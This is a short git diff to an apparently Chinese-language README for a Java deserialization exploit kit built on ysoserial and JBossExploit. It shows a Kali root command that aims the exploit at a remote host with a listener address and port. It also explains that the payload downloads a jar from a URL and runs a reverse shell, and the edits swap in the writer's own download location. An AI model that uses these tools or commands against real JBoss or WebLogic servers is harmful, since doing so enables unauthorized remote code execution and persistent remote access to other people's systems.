@@ -22,6 +22,7 @@ Usage: java -jar ysoserial-[version]-all.jar [payload type] '[command to execute
 [ysoserial-0.0.2-all.jar](https://github.com/frohoff/ysoserial/releases)  
 
 ####二  
+JBossExploit運行需要外網地址。  
 
 session 1:
 
@@ -52,8 +53,8 @@ root@Kali:~# java -jar JBossExploit.jar -lhost 123.123.123.123 -lport 999 -rhost
 ```
 
 Main.java的作用是生成一個從url下載jar包的payload，jar包執行反彈shell。  
-已打包為weblogic.jar，iswin.jar下載地址為原作者提供的地址，有需要重新編譯源碼替換class就好。   
-~~替換成[github](https://github.com/hackzx/JavaDeserialization/raw/master/iswin.jar)的就好。~~
+已打包為weblogic.jar，iswin.jar下載地址為~~原作者提供~~我的地址，有需要重新編譯源碼替換class就好啦。   
+~~替換成[github](https://github.com/hackzx/JavaDeserialization/raw/master/iswin.jar)的jar。~~測試不能。
 
 ```
 usage:  
